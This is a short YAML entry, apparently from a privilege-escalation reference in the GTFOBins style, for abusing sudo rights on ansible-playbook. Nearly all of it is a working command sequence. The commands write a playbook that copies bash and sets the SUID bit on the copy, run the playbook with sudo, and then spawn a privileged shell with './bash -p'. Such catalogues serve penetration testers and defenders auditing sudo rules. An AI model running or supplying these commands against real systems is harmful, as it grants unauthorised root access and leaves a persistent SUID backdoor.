---
functions:
  sudo:
    - description: Running this command will make a copy of bash with SUID permessions, since you copied it as the sudo user; you will be able to get shell as this user.
      code: |
        echo "--- name: shell" >> shell.yml
        echo "  hosts: localhost" >> shell.yml
        echo "  become: yes" >> shell.yml
        echo " " >> shell.yml
        echo "  tasks:" >> shell.yml
        echo "  - name: hack" >> shell.yml
        echo "    shell: 'cp /bin/bash . && chmod +sx bash'" >> shell.yml
        sudo /usr/bin/ansible-playbook shell.yml
        ./bash -p
---